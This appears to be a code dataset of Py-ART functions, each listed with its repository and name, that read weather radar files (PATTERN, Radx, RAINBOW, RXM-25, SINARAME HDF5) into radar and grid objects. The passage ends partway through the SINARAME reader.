ARM-DOE/pyart,read_pattern,"def read_pattern(filename, **kwargs):
    """"""
    Read a netCDF file from a PATTERN project X-band radar.

    Parameters
    ----------
    filename : str
        Name of netCDF file to read data from.

    Returns
    -------
    radar : Radar
        Radar object.

    """"""
    _test_arguments(kwargs)
    filemetadata = FileMetadata('pattern')
    ncobj = netCDF4.Dataset(filename)
    ncvars = ncobj.variables
    nrays = ncvars['Azimuth'].shape[0]
    scan_type = 'ppi'
    time = filemetadata('time')
    nctime = ncvars['Time']
    time['units'] = make_time_unit_str(datetime.datetime.utcfromtimestamp(nctime[0]))
    time['data'] = np.linspace(0, nctime[-1] - nctime[0], nrays)
    _range = filemetadata('range')
    _range['data'] = ncvars['Distance'][:]
    _range['meters_to_center_of_first_gate'] = _range['data'][0]
    _range['meters_between_gates'] = _range['data'][1] - _range['data'][0]
    fields = {}
    field_name = filemetadata.get_field_name('corrected_reflectivity')
    field_dic = filemetadata(field_name)
    field_dic['_FillValue'] = ncvars['Corrected_Reflectivity']._FillValue
    field_dic['data'] = ncvars['Corrected_Reflectivity'][:]
    fields[field_name] = field_dic
    metadata = filemetadata('metadata')
    for k in ['institution', 'title', 'used_algorithms']:
        if k in ncobj.ncattrs():
            metadata[k] = ncobj.getncattr(k)
    latitude = filemetadata('latitude')
    longitude = filemetadata('longitude')
    altitude = filemetadata('altitude')
    latitude['data'] = np.array([ncobj.latitude[:-1]], dtype='float64')
    longitude['data'] = np.array([ncobj.longitude[:-1]], dtype='float64')
    altitude['data'] = np.array([ncobj.elevation], dtype='float64')
    sweep_number = filemetadata('sweep_number')
    sweep_mode = filemetadata('sweep_mode')
    fixed_angle = filemetadata('fixed_angle')
    sweep_start_ray_index = filemetadata('sweep_start_ray_index')
    sweep_end_ray_index = filemetadata('sweep_end_ray_index')
    sweep_number['data'] = np.arange(1, dtype='int32')
    sweep_mode['data'] = np.array(1 * ['azimuth_surveillance'])
    fixed_angle['data'] = np.array([0], dtype='float32')
    sweep_start_ray_index['data'] = np.array([0], dtype='int32')
    sweep_end_ray_index['data'] = np.array([nrays - 1], dtype='int32')
    azimuth = filemetadata('azimuth')
    elevation = filemetadata('elevation')
    azimuth['data'] = ncvars['Azimuth'][:]
    elevation['data'] = np.array([0.0], dtype='float32')
    instrument_parameters = None
    return Radar(time, _range, fields, metadata, scan_type, latitude, longitude, altitude, sweep_number, sweep_mode, fixed_angle, sweep_start_ray_index, sweep_end_ray_index, azimuth, elevation, instrument_parameters=instrument_parameters)"
ARM-DOE/pyart,read_radx,"def read_radx(filename, radx_dir=None, **kwargs):
    """"""
    Read a file by first converting it to Cf/Radial using RadxConvert.

    Parameters
    ----------
    filename : str
        Name of file to read using RadxConvert.

    radx_dir : str, optional
        path to the radx install

    Returns
    -------
    radar : Radar
        Radar object.

    """"""
    _test_arguments(kwargs)
    if radx_dir is not None:
        executable = os.path.join(radx_dir, 'RadxConvert')
    else:
        executable = 'RadxConvert'
    tmpfile = tempfile.mkstemp(suffix='.nc', dir='.')[1]
    (head, tail) = os.path.split(tmpfile)
    try:
        subprocess.check_call([executable, '-const_ngates', '-outdir', head, '-outname', tail, '-f', filename])
        if not os.path.isfile(tmpfile):
            raise OSError('RadxConvert failed to create a file, upgrading to the  latest version of Radx may be necessary.')
        radar = read_cfradial(tmpfile)
    finally:
        os.remove(tmpfile)
    return radar"
ARM-DOE/pyart,read_radx_grid,"def read_radx_grid(filename, exclude_fields=None, **kwargs):
    """"""
    Read a netCDF grid file produced by radx2grid within LROSE.

    Parameters
    ----------
    filename : str
        Filename of netCDF grid file to read.  This file must have been
        produced by :py:func:`write_grid` or have identical layout.

    Other Parameters
    ----------------
    exclude_fields : list
        A list of fields to exclude from the grid object.

    Returns
    -------
    grid : Grid
        Grid object containing gridded data.

    """"""
    _test_arguments(kwargs)
    if exclude_fields is None:
        exclude_fields = []
    reserved_variables = ['time', 'x', 'y', 'z', 'origin_latitude', 'origin_longitude', 'origin_altitude', 'point_x', 'point_y', 'point_z', 'projection', 'point_latitude', 'point_longitude', 'point_altitude', 'radar_latitude', 'radar_longitude', 'radar_altitude', 'radar_name', 'radar_time', 'base_time', 'time_offset', 'ProjectionCoordinateSystem']
    dset = netCDF4.Dataset(filename, mode='r')
    metadata = {k: getattr(dset, k) for k in dset.ncattrs()}
    time = _ncvar_to_dict(dset.variables['time'])
    try:
        origin_latitude = _ncvar_to_dict(dset.variables['lat0'])
        origin_latitude['data'] = [dset.variables['grid_mapping_0'].latitude_of_projection_origin]
        origin_longitude = _ncvar_to_dict(dset.variables['lon0'])
        try:
            origin_longitude['data'] = [dset.variables['grid_mapping_0'].longitude_of_central_meridian]
        except AttributeError:
            origin_longitude['data'] = [dset.variables['grid_mapping_0'].longitude_of_projection_origin]
    except KeyError:
        origin_latitude = get_metadata('latitude')
        origin_latitude['data'] = [dset.variables['grid_mapping_0'].latitude_of_projection_origin]
        origin_longitude = get_metadata('longitude')
        try:
            origin_longitude['data'] = [dset.variables['grid_mapping_0'].longitude_of_central_meridian]
        except AttributeError:
            origin_longitude['data'] = [dset.variables['grid_mapping_0'].longitude_of_projection_origin]
    origin_altitude = _ncvar_to_dict(dset.variables['z0'])
    origin_altitude['data'] = [origin_altitude['data'][0] * 1000]
    origin_altitude['units'] = 'm'
    x = _ncvar_to_dict(dset.variables['x0'])
    x['data'] = x['data'] * 1000
    x['units'] = 'm'
    y = _ncvar_to_dict(dset.variables['y0'])
    y['data'] = y['data'] * 1000
    y['units'] = 'm'
    z = _ncvar_to_dict(dset.variables['z0'])
    z['data'] = z['data'] * 1000
    z['units'] = 'm'
    projection = get_grid_projection_dict(dset)
    if '_include_lon_0_lat_0' in projection:
        v = projection['_include_lon_0_lat_0']
        projection['_include_lon_0_lat_0'] = {'true': True, 'false': False}[v]
    fields = {}
    field_shape = tuple((len(dset.dimensions[d]) for d in ['z0', 'y0', 'x0']))
    field_shape_with_time = (1,) + field_shape
    field_keys = [k for k in dset.variables if k not in reserved_variables]
    for field in field_keys:
        if field in exclude_fields:
            continue
        field_dic = _ncvar_to_dict(dset.variables[field])
        if field_dic['data'].shape == field_shape_with_time:
            field_dic['data'].shape = field_shape
            fields[field] = field_dic
        else:
            warnings.warn('Field %s skipped due to incorrect shape' % field)
    if 'radar_latitude' in dset.variables:
        radar_latitude = _ncvar_to_dict(dset.variables['radar_latitude'])
    else:
        radar_latitude = None
    if 'radar_longitude' in dset.variables:
        radar_longitude = _ncvar_to_dict(dset.variables['radar_longitude'])
    else:
        radar_longitude = None
    if 'radar_altitude' in dset.variables:
        radar_altitude = _ncvar_to_dict(dset.variables['radar_altitude'])
    else:
        radar_altitude = None
    if 'radar_name' in dset.variables:
        radar_name = _ncvar_to_dict(dset.variables['radar_name'])
    else:
        radar_name = None
    if 'radar_time' in dset.variables:
        radar_time = _ncvar_to_dict(dset.variables['radar_time'])
    else:
        radar_time = None
    dset.close()
    return Grid(time, fields, metadata, origin_latitude, origin_longitude, origin_altitude, x, y, z, projection=projection, radar_latitude=radar_latitude, radar_longitude=radar_longitude, radar_altitude=radar_altitude, radar_name=radar_name, radar_time=radar_time)"
ARM-DOE/pyart,get_grid_projection_dict,"def get_grid_projection_dict(dset):
    grid_map_name = dset.variables['grid_mapping_0'].grid_mapping_name
    if grid_map_name == 'azimuthal_equidistant':
        projstr = 'pyart_aeqd'
        projection = {'lat_0': dset.variables['grid_mapping_0'].latitude_of_projection_origin, 'lon_0': dset.variables['grid_mapping_0'].longitude_of_projection_origin, 'proj': projstr, 'units': 'm', 'vunits': 'm', 'x_0': dset.variables['grid_mapping_0'].false_easting * 1000, 'y_0': dset.variables['grid_mapping_0'].false_northing * 1000}
    elif grid_map_name == 'transverse_mercator':
        projstr = 'tmerc'
        projection = {'+k_0': dset.variables['grid_mapping_0'].scale_factor_at_central_meridian, 'lat_0': dset.variables['grid_mapping_0'].latitude_of_projection_origin, 'lon_0': dset.variables['grid_mapping_0'].longitude_of_central_meridian, 'proj': projstr, 'units': 'm', 'vunits': 'm', 'x_0': dset.variables['grid_mapping_0'].false_easting * 1000, 'y_0': dset.variables['grid_mapping_0'].false_northing * 1000}
    return projection"
ARM-DOE/pyart,read_rainbow_wrl,"def read_rainbow_wrl(filename, field_names=None, additional_metadata=None, file_field_names=False, exclude_fields=None, include_fields=None, **kwargs):
    """"""
    Read a RAINBOW file.
    This routine has been tested to read rainbow5 files version 5.22.3,
    5.34.16 and 5.35.1.
    Since the rainbow file format is evolving constantly there is no guaranty
    that it can work with other versions.
    If necessary, the user should adapt to code according to its own
    file version and raise an issue upstream.

    Data types read by this routine:
    Reflectivity: dBZ, dBuZ, dBZv, dBuZv
    Velocity: V, Vu, Vv, Vvu
    Spectrum width: W, Wu, Wv, Wvu
    Differential reflectivity: ZDR, ZDRu
    Co-polar correlation coefficient: RhoHV, RhoHVu
    Co-polar differential phase: PhiDP, uPhiDP, uPhiDPu
    Specific differential phase: KDP, uKDP, uKDPu
    Signal quality parameters: SQI, SQIu, SQIv, SQIvu
    Temperature: TEMP
    Position of the range bin respect to the ISO0: ISO0

    Parameters
    ----------
    filename : str
        Name of the RAINBOW file to read.
    field_names : dict, optional
        Dictionary mapping RAINBOW field names to radar field names. If a
        data type found in the file does not appear in this dictionary or has
        a value of None it will not be placed in the radar.fields dictionary.
        A value of None, the default, will use the mapping defined in the
        Py-ART configuration file.
    additional_metadata : dict of dicts, optional
        Dictionary of dictionaries to retrieve metadata during this read.
        This metadata is not used during any successive file reads unless
        explicitly included.  A value of None, the default, will not
        introduct any addition metadata and the file specific or default
        metadata as specified by the Py-ART configuration file will be used.
    file_field_names : bool, optional
        True to use the MDV data type names for the field names. If this
        case the field_names parameter is ignored. The field dictionary will
        likely only have a 'data' key, unless the fields are defined in
        `additional_metadata`.
    exclude_fields : list or None, optional
        List of fields to exclude from the radar object. This is applied
        after the `file_field_names` and `field_names` parameters. Set
        to None to include all fields specified by include_fields.
    include_fields : list or None, optional
        List of fields to include from the radar object. This is applied
        after the `file_field_names` and `field_names` parameters. Set
        to None to include all fields not specified by exclude_fields.

    Returns
    -------
    radar : Radar
        Radar object containing data from RAINBOW file.

    """"""
    if not _WRADLIB_AVAILABLE:
        raise MissingOptionalDependency('wradlib is required to use read_rainbow_wrl but is not installed')
    _test_arguments(kwargs)
    bfile = os.path.basename(filename)
    supported_file = bfile.endswith('.vol') or bfile.endswith('.azi') or bfile.endswith('.ele')
    if not supported_file:
        raise ValueError('Only data files with extension .vol, .azi or .ele are supported')
    if field_names is None:
        field_names = RAINBOW_FIELD_NAMES
    filemetadata = FileMetadata('RAINBOW', field_names, additional_metadata, file_field_names, exclude_fields, include_fields)
    rbf = read_rainbow(filename, loaddata=True)
    nslices = int(rbf['volume']['scan']['pargroup']['numele'])
    if nslices > 1:
        single_slice = False
        common_slice_info = rbf['volume']['scan']['slice'][0]
    else:
        single_slice = True
        common_slice_info = rbf['volume']['scan']['slice']
    datatype = common_slice_info['slicedata']['rawdata']['@type']
    field_name = filemetadata.get_field_name(datatype)
    if field_name is None:
        raise ValueError('Field Name Unknown')
    latitude = filemetadata('latitude')
    longitude = filemetadata('longitude')
    altitude = filemetadata('altitude')
    metadata = filemetadata('metadata')
    sweep_start_ray_index = filemetadata('sweep_start_ray_index')
    sweep_end_ray_index = filemetadata('sweep_end_ray_index')
    sweep_number = filemetadata('sweep_number')
    sweep_mode = filemetadata('sweep_mode')
    fixed_angle = filemetadata('fixed_angle')
    elevation = filemetadata('elevation')
    _range = filemetadata('range')
    azimuth = filemetadata('azimuth')
    _time = filemetadata('time')
    field_dic = filemetadata(field_name)
    frequency = filemetadata('frequency')
    if 'sensorinfo' in rbf['volume'].keys():
        latitude['data'] = np.array([rbf['volume']['sensorinfo']['lat']], dtype='float64')
        longitude['data'] = np.array([rbf['volume']['sensorinfo']['lon']], dtype='float64')
        altitude['data'] = np.array([rbf['volume']['sensorinfo']['alt']], dtype='float64')
        frequency['data'] = np.array([300000000.0 / float(rbf['volume']['sensorinfo']['wavelen'])], dtype='float64')
    elif 'radarinfo' in rbf['volume'].keys():
        latitude['data'] = np.array([rbf['volume']['radarinfo']['@lat']], dtype='float64')
        longitude['data'] = np.array([rbf['volume']['radarinfo']['@lon']], dtype='float64')
        altitude['data'] = np.array([rbf['volume']['radarinfo']['@alt']], dtype='float64')
        frequency['data'] = np.array([300000000.0 / float(rbf['volume']['radarinfo']['wavelen'])], dtype='float64')
    if 'antspeed' in common_slice_info:
        ant_speed = float(common_slice_info['antspeed'])
    else:
        ant_speed = 10.0
        print('WARNING: Unable to read antenna speed. Default value of ' + str(ant_speed) + ' deg/s will be used')
    angle_step = float(common_slice_info['anglestep'])
    sweep_number['data'] = np.arange(nslices, dtype='int32')
    rays_per_sweep = np.empty(nslices, dtype='int32')
    if single_slice:
        rays_per_sweep[0] = int(common_slice_info['slicedata']['rawdata']['@rays'])
        maxbin = int(common_slice_info['slicedata']['rawdata']['@bins'])
        ssri = np.array([0], dtype='int32')
        seri = np.array([rays_per_sweep[0] - 1], dtype='int32')
    else:
        nbins_sweep = np.empty(nslices, dtype='int32')
        for i in range(nslices):
            slice_info = rbf['volume']['scan']['slice'][i]
            rays_per_sweep[i] = int(slice_info['slicedata']['rawdata']['@rays'])
            nbins_sweep[i] = int(slice_info['slicedata']['rawdata']['@bins'])
        if any(nbins_sweep != nbins_sweep[0]):
            print('WARNING: number of range bins changes between sweeps ' + 'max number of bins will be used')
        maxbin = nbins_sweep.max()
        ssri = np.cumsum(np.append([0], rays_per_sweep[:-1])).astype('int32')
        seri = np.cumsum(rays_per_sweep).astype('int32') - 1
    total_rays = sum(rays_per_sweep)
    sweep_start_ray_index['data'] = ssri
    sweep_end_ray_index['data'] = seri
    if not single_slice:
        for i in range(nslices):
            slice_info = rbf['volume']['scan']['slice'][i]
            if slice_info['rangestep'] != common_slice_info['rangestep']:
                raise ValueError('range resolution changes between sweeps')
    r_res = float(common_slice_info['rangestep']) * 1000.0
    if 'start_range' in common_slice_info.keys():
        start_range = float(common_slice_info['start_range']) * 1000.0
    else:
        start_range = 0.0
    _range['data'] = np.linspace(start_range + r_res / 2.0, float(maxbin - 1.0) * r_res + r_res / 2.0, maxbin).astype('float32')
    _range['meters_between_gates'] = r_res
    _range['meters_to_center_of_first_gate'] = _range['data'][0]
    t_fixed_angle = np.empty(nslices, dtype='float64')
    moving_angle = np.empty(total_rays, dtype='float64')
    static_angle = np.empty(total_rays, dtype='float64')
    time_data = np.empty(total_rays, dtype='float64')
    fdata = np.ma.zeros((total_rays, maxbin), dtype='float32', fill_value=get_fillvalue())
    if bfile.endswith('.vol') or bfile.endswith('.azi'):
        scan_type = 'ppi'
        sweep_mode['data'] = np.array(nslices * ['azimuth_surveillance'])
    else:
        scan_type = 'rhi'
        sweep_mode['data'] = np.array(['elevation_surveillance'])
    for i in range(nslices):
        if single_slice:
            slice_info = common_slice_info
        else:
            slice_info = rbf['volume']['scan']['slice'][i]
        t_fixed_angle[i] = float(slice_info['posangle'])
        static_angle[ssri[i]:seri[i] + 1] = t_fixed_angle[i]
        (moving_angle[ssri[i]:seri[i] + 1], angle_start, angle_stop) = _get_angle(slice_info['slicedata']['rayinfo'], angle_step=angle_step, scan_type=scan_type)
        (time_data[ssri[i]:seri[i] + 1], sweep_start_epoch) = _get_time(slice_info['slicedata']['@date'], slice_info['slicedata']['@time'], angle_start[0], angle_stop[-1], angle_step, rays_per_sweep[i], ant_speed, scan_type=scan_type)
        if i == 0:
            volume_start_epoch = sweep_start_epoch + 0.0
            start_time = datetime.datetime.utcfromtimestamp(volume_start_epoch)
        fdata[ssri[i]:seri[i] + 1, :] = _get_data(slice_info['slicedata']['rawdata'], rays_per_sweep[i], nbins_sweep[i], maxbin)
    if bfile.endswith('.vol') or bfile.endswith('.azi'):
        azimuth['data'] = moving_angle
        elevation['data'] = static_angle
    else:
        azimuth['data'] = static_angle
        elevation['data'] = moving_angle
    fixed_angle['data'] = t_fixed_angle
    _time['data'] = time_data - volume_start_epoch
    _time['units'] = make_time_unit_str(start_time)
    fields = {}
    field_dic['_FillValue'] = get_fillvalue()
    field_dic['data'] = fdata
    fields[field_name] = field_dic
    instrument_parameters = dict()
    instrument_parameters.update({'frequency': frequency})
    return Radar(_time, _range, fields, metadata, scan_type, latitude, longitude, altitude, sweep_number, sweep_mode, fixed_angle, sweep_start_ray_index, sweep_end_ray_index, azimuth, elevation, instrument_parameters=instrument_parameters)"
ARM-DOE/pyart,_get_angle,"def _get_angle(ray_info, angle_step=None, scan_type='ppi'):
    """"""
    obtains the ray angle start, stop and center

    Parameters
    ----------
    ray_info : dictionary of dictionaries
        contains the ray info
    angle_step : float
        Optional. The angle step. Used in case there is no information of
        angle stop. Otherwise ignored.
    scan_type : str
        Default ppi. scan_type. Either ppi or rhi.

    Returns
    -------
    moving_angle : numpy array
        the central point of the angle [Deg]
    angle_start :
        the starting point of the angle [Deg]
    angle_stop :
        the end point of the angle [Deg]

    """"""
    bin_to_deg = 360.0 / 65536.0

    def _extract_angles(data):
        angle = np.array(data * bin_to_deg, dtype='float64')
        if scan_type == 'rhi':
            ind = (angle > 225.0).nonzero()
            angle[ind] -= 360.0
        return angle
    try:
        angle_start = _extract_angles(ray_info['data'])
        if angle_step is None:
            raise ValueError('Unknown angle step')
        angle_stop = angle_start + angle_step
    except TypeError:
        angle_start = _extract_angles(ray_info[0]['data'])
        angle_stop = _extract_angles(ray_info[1]['data'])
    moving_angle = np.angle((np.exp(1j * np.deg2rad(angle_start)) + np.exp(1j * np.deg2rad(angle_stop))) / 2.0, deg=True)
    moving_angle[moving_angle < 0.0] += 360.0
    return (moving_angle, angle_start, angle_stop)"
ARM-DOE/pyart,_get_data,"def _get_data(rawdata, nrays, nbins, maxbin):
    """"""
    Obtains the raw data

    Parameters
    ----------
    rawdata : dictionary of dictionaries
        contains the raw data information
    nrays : int
        Number of rays in sweep
    nbins : int
        Number of bins in ray

    Returns
    -------
    data : numpy array
        the data

    """"""
    databin = rawdata['data']
    datamin = float(rawdata['@min'])
    datamax = float(rawdata['@max'])
    datadepth = float(rawdata['@depth'])
    datatype = rawdata['@type']
    data = np.array(datamin + databin * (datamax - datamin) / 2 ** datadepth, dtype='float32')
    mask = databin == 0
    data[mask.nonzero()] = get_fillvalue()
    if datatype == 'PhiDP' or datatype == 'uPhiDP' or datatype == 'uPhiDPu':
        is_above_180 = data > 180.0
        data[is_above_180.nonzero()] -= 360.0
    data = np.reshape(data, [nrays, nbins])
    mask = np.reshape(mask, [nrays, nbins])
    data_tmp = np.full((nrays, maxbin), get_fillvalue())
    data_tmp[:nrays, :nbins] = data
    mask_tmp = np.full((nrays, maxbin), True)
    mask_tmp[:nrays, :nbins] = mask
    masked_data = np.ma.array(data_tmp, mask=mask_tmp, fill_value=get_fillvalue())
    return masked_data"
ARM-DOE/pyart,_get_time,"def _get_time(date_sweep, time_sweep, first_angle_start, last_angle_stop, angle_step, nrays, ant_speed, scan_type='ppi'):
    """"""
    Computes the time at the center of each ray

    Parameters
    ----------
    date_sweep, time_sweep : str
        the date and time of the sweep
    first_angle_start : float
        The starting point of the first angle in the sweep
    last_angle_stop : float
        The end point of the last angle in the sweep
    nrays : int
        Number of rays in sweep
    ant_speed : float
        antenna speed [deg/s]
    scan_type : str
        Default ppi. scan_type. Either ppi or rhi.

    Returns
    -------
    time_data : numpy array
        the time of each ray
    sweep_start_epoch : float
        sweep start time in seconds since 1.1.1970

    """"""
    datetime_sweep = datetime.datetime.strptime(date_sweep + ' ' + time_sweep, '%Y-%m-%d %H:%M:%S')
    sweep_start_epoch = (datetime_sweep - datetime.datetime(1970, 1, 1)).total_seconds()
    if scan_type == 'ppi':
        if last_angle_stop > first_angle_start and (last_angle_stop - first_angle_start) / nrays > angle_step:
            sweep_duration = (last_angle_stop - first_angle_start) / ant_speed
        else:
            sweep_duration = (last_angle_stop + 360.0 - first_angle_start) / ant_speed
    elif last_angle_stop > first_angle_start:
        sweep_duration = (last_angle_stop - first_angle_start) / ant_speed
    else:
        sweep_duration = (first_angle_start - last_angle_stop) / ant_speed
    time_angle = sweep_duration / nrays
    sweep_end_epoch = sweep_start_epoch + sweep_duration
    time_data = np.linspace(sweep_start_epoch + time_angle / 2.0, sweep_end_epoch - time_angle / 2.0, num=nrays)
    return (time_data, sweep_start_epoch)"
ARM-DOE/pyart,_extract_angles,"def _extract_angles(data):
    angle = np.array(data * bin_to_deg, dtype='float64')
    if scan_type == 'rhi':
        ind = (angle > 225.0).nonzero()
        angle[ind] -= 360.0
    return angle"
ARM-DOE/pyart,read_rxm25,"def read_rxm25(filename, cfradial_outfile=None, heading=None):
    """"""
    Read in Ridgeline Instruments RXM-25 formatted NetCDF data.

    Parameters
    ----------
    filename : str
        Name of Ridgeline Instruments (RLI) RXM-25 formatted NetCDF file
        from which to read data.
    cfradial_outfile : str, optional
        If file is to be converted to CF-Radial format, specify the output
        filename here.
    heading : float, optional
        If a heading offset exists, enter it here (in degrees).

    Returns
    -------
    radar : Radar
        Radar object.

    """"""
    if not _PYTZ_AVAILABLE:
        raise MissingOptionalDependency('Pytz is required to use read_rxm25 but is ' + 'not installed')
    data = netCDF4.Dataset(filename, 'r')
    ngates = data.dimensions['Gate'].size
    rays_per_sweep = data.dimensions['Radial'].size
    radar = make_empty_ppi_radar(ngates, rays_per_sweep, 1)
    nineteen89 = datetime.datetime(1989, 1, 1, 0, 0, 1, tzinfo=pytz.utc)
    baseTime = np.array([datetime.datetime.fromtimestamp(t, tz=pytz.UTC) for t in data.variables['Time'][:]])
    radar.time['data'] = np.array([t.total_seconds() for t in baseTime - nineteen89])
    if heading is not None:
        radar.heading = heading
        radar.azimuth['data'] = np.mod(data['Azimuth'][:] - radar.heading, 360.0)
    else:
        radar.azimuth['data'] = data['Azimuth'][:]
    radar.longitude['data'] = np.array([data.Longitude], dtype='float64')
    radar.latitude['data'] = np.array([data.Latitude], dtype='float64')
    radar.elevation['data'] = data['Elevation'][:]
    radar.altitude['data'] = np.array([data.Height], dtype='float64')
    fixed_agl_data = np.empty((1,), dtype='float32')
    fixed_agl_data[:] = np.mean(radar.elevation['data'][:rays_per_sweep])
    radar.fixed_angle['data'] = fixed_agl_data
    radar.range['data'] = np.linspace(data['StartRange'][0] / 1000, (ngates - 1) * data['GateWidth'][0] / 1000 + data['StartRange'][0] / 1000, ngates)
    ref = data['Reflectivity'][:]
    norm_pow = data['NormalizedCoherentPower'][:]
    spec_w = data['SpectralWidth'][:]
    vel = data['Velocity'][:]
    corr_ref = data['CorrectedReflectivity'][:]
    diff_ref = data['DifferentialReflectivity'][:]
    diff_phase = data['DifferentialPhase'][:]
    spec_phase = data['SpecificPhase'][:]
    corr_diff_ref = data['CorrectedDifferentialReflectivity'][:]
    sig_noise = data['SignalToNoiseRatio'][:]
    rain_rate = data['RainfallRate'][:]
    cross_ra = data['CrossPolCorrelation'][:]
    fields = {'reflectivity': get_metadata('reflectivity'), 'normalized_coherent_power': get_metadata('normalized_coherent_power'), 'spectral_width': get_metadata('spectral_width'), 'velocity': get_metadata('velocity'), 'corrected_reflectivity': get_metadata('correct_reflectivity'), 'differential_reflectivity': get_metadata('differential_reflectivity'), 'differential_phase': get_metadata('differential_phase'), 'specific_differential_phase': get_metadata('specific_differential_phase'), 'corrected_differential_reflectivity': get_metadata('corrected_differential_reflectivity'), 'signal_to_noise_ratio': get_metadata('signal_to_noise_ratio'), 'rain_rate': get_metadata('rain_rate'), 'cross_correlation_ratio': get_metadata('cross_correlation_ratio')}
    radar.fields = fields
    radar.fields['reflectivity']['data'] = ref
    radar.fields['normalized_coherent_power']['data'] = norm_pow
    radar.fields['spectral_width']['data'] = spec_w
    radar.fields['velocity']['data'] = vel
    radar.fields['corrected_reflectivity']['data'] = corr_ref
    radar.fields['differential_reflectivity']['data'] = diff_ref
    radar.fields['differential_phase']['data'] = diff_phase
    radar.fields['specific_differential_phase']['data'] = spec_phase
    radar.fields['corrected_differential_reflectivity']['data'] = corr_diff_ref
    radar.fields['signal_to_noise_ratio']['data'] = sig_noise
    radar.fields['rain_rate']['data'] = rain_rate
    radar.fields['cross_correlation_ratio']['data'] = cross_ra
    radar.metadata['instrument_name'] = 'RXM-25'
    if cfradial_outfile is not None:
        pyart.io.write_cfradial(cfradial_outfile, radar, arm_time_variables=True)
    return radar"
ARM-DOE/pyart,read_sinarame_h5,"def read_sinarame_h5(filename, field_names=None, additional_metadata=None, file_field_names=False, exclude_fields=None, include_fields=None, **kwargs):
    """"""
    Read a SINARAME_H5 file.

    Parameters
    ----------
    filename : str
        Name of the SINARAME_H5 file to read.
    field_names : dict, optional
        Dictionary mapping SINARAME_H5 field names to radar field names. If a
        data type found in the file does not appear in this dictionary or has
        a value of None it will not be placed in the radar.fields dictionary.
        A value of None, the default, will use the mapping defined in the
        Py-ART configuration file.
    additional_metadata : dict of dicts, optional
        Dictionary of dictionaries to retrieve metadata from during this read.
        This metadata is not used during any successive file reads unless
        explicitly included.  A value of None, the default, will not
        introduct any addition metadata and the file specific or default
        metadata as specified by the Py-ART configuration file will be used.
    file_field_names : bool, optional
        True to use the MDV data type names for the field names. If this
        case the field_names parameter is ignored. The field dictionary will
        likely only have a 'data' key, unless the fields are defined in
        `additional_metadata`.
    exclude_fields : list or None, optional
        List of fields to exclude from the radar object. This is applied
        after the `file_field_names` and `field_names` parameters. Set
        to None to include all fields specified by include_fields.
    include_fields : list or None, optional
        List of fields to include from the radar object. This is applied
        after the `file_field_names` and `field_names` parameters. Set
        to None to include all fields not specified by exclude_fields.


    Returns
    -------
    radar : Radar
        Radar object containing data from SINARAME_H5 file.

    """"""
    if not _H5PY_AVAILABLE:
        raise MissingOptionalDependency('h5py is required to use read_sinarame_h5 but is not installed')
    _test_arguments(kwargs)
    if field_names is None:
        field_names = SINARAME_H5_FIELD_NAMES
    filemetadata = FileMetadata('SINARAME_h5', field_names, additional_metadata, file_field_names, exclude_fields, include_fields)
    hfile = h5py.File(filename, 'r')
    SINARAME_object = _to_str(hfile['what'].attrs['object'])
    if SINARAME_object not in ['PVOL', 'SCAN', 'ELEV', 'AZIM']:
        raise NotImplementedError('object: %s not implemented.' % SINARAME_object)
    datasets = [k for k in hfile if k.startswith('dataset')]
    datasets.sort(key=lambda x: int(x[7:]))
    nsweeps = len(datasets)
    latitude = filemetadata('latitude')
    longitude = filemetadata('longitude')
    altitude = filemetadata('altitude')
    h_where = hfile['where'].attrs
    latitude['data'] = np.array([h_where['lat']], dtype='float64')
    longitude['data'] = np.array([h_where['lon']], dtype='float64')
    altitude['data'] = np.array([h_where['height']], dtype='float64')
    metadata = filemetadata('metadata')
    metadata['source'] = _to_str(hfile['what'].attrs['source'])
    metadata['original_container'] = 'SINARAME_h5'
    metadata['SINARAME_conventions'] = _to_str(hfile.attrs['Conventions'])
    h_what = hfile['what'].attrs
    metadata['version'] = _to_str(h_what['version'])
    metadata['source'] = _to_str(h_what['source'])
    try:
        ds1_how = hfile[datasets[0]]['how'].attrs
    except KeyError:
        ds1_how = {}
    if 'system' in ds1_how:
        metadata['system'] = ds1_how['system']
    if 'software' in ds1_how:
        metadata['software'] = ds1_how['software']
    if 'sw_version' in ds1_how:
        metadata['sw_version'] = ds1_how['sw_version']
    sweep_start_ray_index = filemetadata('sweep_start_ray_index')
    sweep_end_ray_index = filemetadata('sweep_end_ray_index')
    if SINARAME_object in ['AZIM', 'SCAN', 'PVOL']:
        rays_per_sweep = [int(hfile[d]['where'].attrs['nrays']) for d in datasets]
    elif SINARAME_object == 'ELEV':
        rays_per_sweep = [int(hfile[d]['where'].attrs['angles'].size) for d in datasets]
    total_rays = sum(rays_per_sweep)
    ssri = np.cumsum(np.append([0], rays_per_sweep[:-1])).astype('int32')
    seri = np.cumsum(rays_per_sweep).astype('int32') - 1
    sweep_start_ray_index['data'] = ssri
    sweep_end_ray_index['data'] = seri
    sweep_number = filemetadata('sweep_number')
    sweep_number['data'] = np.arange(nsweeps, dtype='int32')
    sweep_mode = filemetadata('sweep_mode')
    sweep_mode['data'] = np.array(nsweeps * ['azimuth_surveillance'])
    if SINARAME_object == 'ELEV':
        scan_type = 'rhi'
    else:
        scan_type = 'ppi'
    fixed_angle = filemetadata('fixed_angle')
    if SINARAME_object == 'ELEV':
        sweep_el = [hfile[d]['where'].attrs['az_angle'] for d in datasets]
    else:
        sweep_el = [hfile[d]['where'].attrs['elangle'] for d in datasets]
    fixed_angle['data'] = np.array(sweep_el, dtype='float32')
    elevation = filemetadata('elevation')
    if 'elangles' in ds1_how:
        edata = np.empty(total_rays, dtype='float32')
        for (d, start, stop) in zip(datasets, ssri, seri):
            edata[start:stop + 1] = hfile[d]['how'].attrs['elangles'][:]
        elevation['data'] = edata
    elif SINARAME_object == 'ELEV':
        edata = np.empty(total_rays, dtype='float32')
        for (d, start, stop) in zip(datasets, ssri, seri):
            edata[start:stop + 1] = hfile[d]['where'].attrs['angles'][:]
        elevation['data'] = edata
    else:
        elevation['data'] = np.repeat(sweep_el, rays_per_sweep)
    _range = filemetadata('range')
    if 'rstart' in hfile['dataset1/where'].attrs:
        rstart = [hfile[d]['where'].attrs['rstart'] for d in datasets]
        if any(rstart != rstart[0]):
            raise ValueError('range start changes between sweeps')
        rscale = [hfile[d]['where'].attrs['rscale'] for d in datasets]
        if any(rscale != rscale[0]):
            raise ValueError('range scale changes between sweeps')
        nbins = int(hfile['dataset1']['where'].attrs['nbins'])
        _range['data'] = np.arange(nbins, dtype='float32') * rscale[0] + rstart[0]
        _range['meters_to_center_of_first_gate'] = rstart[0]
        _range['meters_between_gates'] = float(rscale[0])
    else:
        max_range = [hfile[d]['where'].attrs['range'] for d in datasets]
        if any(max_range != max_range[0]):
            raise ValueError('maximum range changes between sweeps')
